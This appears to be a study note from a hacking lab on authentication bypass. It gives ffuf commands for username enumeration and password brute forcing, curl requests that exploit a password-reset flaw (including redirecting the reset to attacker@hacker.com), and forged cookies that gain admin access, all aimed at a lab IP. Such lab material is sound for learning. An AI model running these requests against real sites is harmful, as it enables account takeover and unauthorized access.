# Authentication Bypass

1. User Enumeration
    - Website error messages are great resources for collating this information to build our list of valid usernames
    -  Try entering the username admin and fill in the other form fields with fake information, you'll see we get the error An account with this username already exists
    - Use the existence of this error message to produce a list of valid usernames already signed up on the system by using the ffuf tool
        ```
        ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.49.148.211/customers/signup -mr "username already exists"
        ```

2. Bruteforce
    - After finding valid usernames and making list of it valid_user.txt, we can now use this to attempt a brute force attack on the login page
        ```
        ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.49.148.211/customers/login -fc 200
        ```
    
3. Logic Flaw
    - Sometimes authentication processes contain logic flaws.
    - A logic flaw is when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker. 
    - It can exist in any area of a website
    - Example
        ![Screenshot](/images/logicflaw.png)

    - Curl request 1
        ```
        curl 'http://10.49.148.211/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
        ```

    - Curl request 2:  add another parameter to the POST form, we can control where the password reset email gets delivered.
        ```
        curl 'http://10.49.148.211/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
        ```

    - Now rerunning Curl Request 2 but with your @acmeitsupport.thm in the email field you'll have a ticket created on your account which contains a link to log you in as Robert. Using Robert's account, you can view their support tickets and reveal a flag.
        ```
        curl 'http://10.49.148.211/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'
        ```


4. Cookie Tampering
    - Examining and editing the cookies set by the web server during your online session can have multiple outcomes, such as unauthenticated access, access to another user's account, or elevated privileges

    - For Plain text
        - Requesting the target page
            ```
            curl http://10.49.148.211/cookie-test
            ```
            - Result: Not Logged In
        - Another request with the logged_in cookie set to true and the admin cookie set to false
            ```
            curl -H "Cookie: logged_in=true; admin=false" http://10.49.148.211/cookie-test
            ```
            - Result: Logged In As A User
        -  Last request setting both the logged_in and admin cookie to true
            ```
            curl -H "Cookie: logged_in=true; admin=true" http://10.49.148.211/cookie-test
            ```
            - Result: logged in as admin
    
    - Hashing Cookie
        - Sometimes cookie values can look like a long string of random characters; these are called hashes which are an irreversible representation of the original text.
        - Even though the hash is irreversible, but we can try to unhash it
            ```
            https://crackstation.net/
            ```
    
    - Encodign Cookie
        - Encoding is similar to hashing in that it creates what would seem to be a random string of text, but in fact, the encoding is reversible